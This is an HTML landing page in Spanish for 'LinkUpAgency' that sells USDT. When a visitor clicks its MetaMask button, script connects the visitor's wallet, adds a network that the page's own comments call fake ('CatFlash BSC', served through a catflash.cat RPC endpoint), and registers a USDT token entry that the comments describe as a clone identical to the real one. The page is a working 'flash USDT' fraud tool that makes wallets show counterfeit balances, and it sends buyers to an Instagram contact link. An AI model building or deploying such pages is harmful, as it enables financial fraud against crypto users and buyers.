<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>USDT üí∏ con LinkUpAgency</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background-color: #0f0f0f;
      color: #fff;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 60px 20px;
    }

    h1 {
      font-size: 28px;
      margin-bottom: 40px;
    }

    button {
      padding: 15px 30px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      margin: 12px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .connect {
      background-color: #3b82f6;
      color: white;
    }

    .connect:hover {
      background-color: #2563eb;
    }

    .contact {
      background-color: #10b981;
      color: white;
    }

    .contact:hover {
      background-color: #059669;
    }
  </style>
</head>
<body>

  <h1>USDT üí∏ con LinkUpAgency</h1>

  <!-- Bot√≥n que ejecuta TODO como Catflash -->
  <button class="connect" id="connectBtn">Conectar MetaMask</button>

  <!-- Bot√≥n que lleva a Instagram -->
  <button class="contact" onclick="window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1', '_blank')">
    Contactar o Comprar con LinkUp üîó
  </button>

  <script>
    const connectBtn = document.getElementById('connectBtn');

    connectBtn.addEventListener('click', async () => {
      if (typeof window.ethereum === 'undefined') {
        alert('Por favor instala MetaMask para continuar.');
        return;
      }

      try {
        // Conectar la wallet
        await ethereum.request({ method: 'eth_requestAccounts' });

        // A√±adir la red falsa (como la de Catflash)
        await ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x53c',
            chainName: 'CatFlash BSC',
            rpcUrls: ['https://dataseed-binance.catflash.cat/'],
            nativeCurrency: {
              name: 'BNB',
              symbol: 'BNB',
              decimals: 18
            },
            blockExplorerUrls: ['https://bscscan.com']
          }]
        });

        // A√±adir token falso USDT (id√©ntico al real)
        await ethereum.request({
          method: 'wallet_watchAsset',
          params: {
            type: 'ERC20',
            options: {
              address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // contrato real de USDT (Catflash usa ese clon)
              symbol: 'USDT',
              decimals: 6,
              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
            }
          }
        });

        alert('‚úÖ MetaMask conectado y token USDT a√±adido.');
      } catch (err) {
        console.error(err);
        alert('‚ùå Error al conectar MetaMask o a√±adir red/token.');
      }
    });
  </script>

</body>
</html>
